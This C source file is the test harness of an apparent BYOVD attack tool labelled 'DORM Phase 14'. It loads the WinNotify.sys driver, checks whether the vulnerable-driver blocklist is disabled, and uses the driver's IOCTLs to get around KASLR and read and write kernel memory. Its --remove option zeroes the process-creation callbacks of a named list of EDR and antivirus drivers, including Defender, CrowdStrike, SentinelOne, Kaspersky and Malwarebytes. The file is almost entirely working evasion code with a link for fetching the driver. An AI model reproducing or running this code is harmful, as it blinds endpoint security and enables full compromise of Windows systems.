/*
 * test_byovd_winnotify.c — DORM Phase 14: WinNotify.sys Verification Harness
 * byovd/kernel_subverter/test_byovd_winnotify.c
 *
 * Windows x64 | MinGW/Clang
 * Must run from an elevated (Administrator) PowerShell.
 *
 * Build:
 *   clang byovd/kernel_subverter/byovd_winnotify.c    \
 *         byovd/kernel_subverter/test_byovd_winnotify.c \
 *         -Ibyovd/kernel_subverter                    \
 *         -o test_byovd.exe -lkernel32 -ladvapi32
 *
 * Usage:
 *   .\test_byovd.exe .\WinNotify.sys            enumerate callbacks
 *   .\test_byovd.exe .\WinNotify.sys --remove   zero EDR callbacks
 *
 * Step sequence (simplified vs WinRing0 — no phys scan):
 *   14.0  file check
 *   14.1  byovd_load()             — SCM service + StartService
 *   14.2  byovd_open()             — device handle (\\.\WinNotify)
 *   14.3  byovd_get_kernel_base()  — IOCTL 0x22200C, no NtQSI needed
 *   14.4  byovd_read8(kbase)       — MZ sanity check via IOCTL 0x222040
 *   14.5  dorm_enum / remove       — PspCreateProcessNotifyRoutine
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "byovd.h"

/* ============================================================
   PRIVILEGE HELPERS
   ============================================================ */

static BOOL is_elevated(void)
{
    BOOL e = FALSE; HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &ht)) return FALSE;
    TOKEN_ELEVATION te; DWORD sz = sizeof(te);
    if (GetTokenInformation(ht, TokenElevation, &te, sizeof(te), &sz))
        e = (te.TokenIsElevated != 0);
    CloseHandle(ht); return e;
}

static BOOL enable_load_driver_privilege(void)
{
    HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ht))
        return FALSE;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeLoadDriverPrivilege", &luid);
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    AdjustTokenPrivileges(ht, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError(); CloseHandle(ht);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

static void check_blocklist(void)
{
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
                      0, KEY_READ, &hk) != ERROR_SUCCESS) {
        printf("[blocklist] CI\\Config not found — blocklist inactive\n");
        return;
    }
    DWORD val = 0, sz = sizeof(val), type = 0;
    RegQueryValueExA(hk, "VulnerableDriverBlocklistEnable",
                     NULL, &type, (BYTE *)&val, &sz);
    RegCloseKey(hk);
    printf("[blocklist] VulnerableDriverBlocklistEnable = %lu  (%s)\n",
           val, val ? "ENABLED — may block some drivers" : "disabled ✓");
}

/* ============================================================
   MAIN
   ============================================================ */

int main(int argc, char **argv)
{
    const char *driver_path = ".\\WinNotify.sys";
    BOOL        do_remove   = FALSE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--remove") == 0) do_remove = TRUE;
        else driver_path = argv[i];
    }

    printf("DORM Phase 14 — BYOVD via WinNotify.sys\n");
    printf("==========================================\n\n");

    if (!is_elevated()) {
        printf("[!] NOT elevated — run from Administrator PowerShell\n");
        printf("Press Enter...\n"); getchar();
        return 1;
    }
    printf("[priv] elevated: ok\n");

    check_blocklist();

    printf("[priv] SeLoadDriverPrivilege... ");
    fflush(stdout);
    if (!enable_load_driver_privilege()) {
        printf("FAILED\n");
        getchar(); return 1;
    }
    printf("ok\n\n");

    /* ── 14.0 file check ─────────────────────────────────── */
    char abs_driver[MAX_PATH] = {0};
    GetFullPathNameA(driver_path, MAX_PATH, abs_driver, NULL);
    printf("[14.0] Driver: %s\n", abs_driver);

    if (GetFileAttributesA(abs_driver) == INVALID_FILE_ATTRIBUTES) {
        printf("[14.0] FAILED — file not found\n");
        printf("       Download WinNotify.sys from:\n");
        printf("       https://github.com/Haider303/winnotify-exp/\n");
        getchar(); return 1;
    }
    {
        HANDLE hf = CreateFileA(abs_driver, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            printf("[14.0] file size: %lu bytes\n", GetFileSize(hf, NULL));
            CloseHandle(hf);
        }
        printf("[14.0] tip: Get-AuthenticodeSignature .\\signed.sys\n");
    }
    printf("[14.0] ok\n\n");

    /* ── 14.1 load ──────────────────────────────────────── */
    printf("[14.1] Loading WinNotify.sys...\n");
    fflush(stdout);
    if (!byovd_load(abs_driver)) {
        printf("[14.1] FAILED — error=%lu\n", GetLastError());
        goto cleanup;
    }
    printf("[14.1] ok\n\n");

    /* ── 14.2 open device ───────────────────────────────── */
    printf("[14.2] Opening \\\\.\\WinNotify...\n");
    fflush(stdout);
    if (!byovd_open()) {
        printf("[14.2] FAILED — error=%lu\n", GetLastError());
        goto cleanup;
    }
    printf("[14.2] ok\n\n");

    /* ── 14.3 KASLR defeat ──────────────────────────────── */
    printf("[14.3] Defeating KASLR via IOCTL 0x22200C...\n");
    fflush(stdout);

    ULONG64 kernel_base = byovd_get_kernel_base();
    if (!kernel_base) {
        printf("[14.3] FAILED — kernel base returned 0\n");
        printf("[14.3] Check: is WinNotify.sys loaded? device open?\n");
        goto cleanup;
    }
    printf("[14.3] ntoskrnl.exe @ 0x%016llX  (KASLR defeated) ✓\n\n",
           (unsigned long long)kernel_base);

    /* ── 14.4 verify R/W ────────────────────────────────── */
    printf("[14.4] Verifying kernel R/W (reading ntoskrnl MZ header)...\n");
    fflush(stdout);

    ULONG64 mz = 0;
    if (!byovd_read8(kernel_base, &mz)) {
        printf("[14.4] read8 FAILED — IOCTL 0x222040 error\n");
        printf("[14.4] Possible: guard condition — *(kbase-0x10) might be 0\n");
        printf("[14.4] Trying kbase+8 instead...\n");

        /* alternative: read at kbase+8, no guard issue since we offset differently */
        if (!byovd_read8(kernel_base + 8, &mz)) {
            printf("[14.4] second attempt also failed\n");
            goto cleanup;
        }
        printf("[14.4] bytes @kbase+8: 0x%016llX\n", (unsigned long long)mz);
    } else {
        printf("[14.4] bytes @kbase+0: 0x%016llX  %s\n",
               (unsigned long long)mz,
               ((mz & 0xFFFF) == 0x5A4D)
                   ? "MZ valid ✓ — kernel R/W confirmed"
                   : "(not MZ — guard may have fired, check kbase-0x10 mapping)");
    }
    printf("[14.4] ok\n\n");

    /* ── 14.5 callbacks ─────────────────────────────────── */
    printf("[14.5] %s PspCreateProcessNotifyRoutine...\n",
           do_remove ? "Patching" : "Enumerating");
    printf("        output → callbacks.json\n\n");
    fflush(stdout);

    int cb_count;
    if (do_remove) {
        const char *bl[] = {
            "MsSense.sys",
            "WdFilter.sys",
            "csagent.sys",
            "CsFirmwareAnalysis.sys",
            "SentinelMonitor.sys",
            "mbamswissarmy.sys",
            "klflt.sys",
            "eaw.sys",
        };
        cb_count = dorm_remove_process_callbacks(
                       bl, (int)(sizeof(bl) / sizeof(bl[0])),
                       "callbacks.json");
        printf("\n[14.5] patching complete — %d callbacks found\n", cb_count);
    } else {
        cb_count = dorm_enum_process_callbacks("callbacks.json");
        printf("\n[14.5] %d callbacks enumerated\n", cb_count);
        printf("        pass --remove to zero blacklisted EDR entries\n");
    }

cleanup:
    printf("\n[cleanup] Unloading WinNotify.sys...\n");
    byovd_unload();
    printf("Phase 14 complete. callbacks.json written.\n");
    printf("\nPress Enter to close...\n");
    getchar();
    return 0;
}